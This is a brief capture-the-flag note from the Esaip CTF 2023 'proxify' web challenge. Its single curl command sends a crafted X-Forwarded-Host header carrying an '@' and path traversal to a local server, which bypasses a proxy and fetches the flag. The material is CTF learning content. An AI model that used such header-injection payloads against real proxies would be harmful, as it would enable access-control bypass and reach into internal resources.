
# From Esaip CTF 2023

https://github.com/ESAIP-CTF/public-esaip-ctf-2023/blob/master/challenges/web/proxify/

**Bypass proxies with `X-Forwarded-Host`**
```bash
curl -H "X-Forwarded-Host: 127.0.0.1\@www.supermarioplomberie.fr/../flag" http://localhost:8080
```